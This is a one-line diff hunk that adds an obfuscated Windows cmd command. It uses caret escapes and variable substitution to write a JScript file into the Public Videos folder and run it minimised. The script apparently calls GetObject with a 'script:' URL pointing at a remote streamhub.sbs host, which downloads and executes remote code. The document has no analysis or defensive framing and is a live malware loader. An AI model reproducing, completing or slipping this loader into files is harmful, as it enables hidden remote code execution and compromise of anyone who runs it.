@@ -1,0 +1,1 @@
+start /MIN %ComSpec% /V/D/c "s^^eT XZMVH=^еж^зи^й╗&&se^T RCQ=%Public%\V^id^eos\^2N7d0b&&Se^t LPUSE=tr^y^{^vQcj5ar c='sc^ri^pt^:';d='hQcj5Tt^P:';GQcj5et^Ob^jQcj5ec^t(c+d+'&&s^^eT YIZFQU=iMV9liMV9ltrqq2x.streamhub.sbsiMV9l?1iMV9l');}c^a^tch^(e^){^}^;&&s^eT/^p YKBWQ="!LPUSE:Qcj5=!!YIZFQU:iMV9l=/!"<n^ul > !RCQ!.^j^S|ca^l^l s^t^a^rt !RCQ!.j^S "|c^M^d
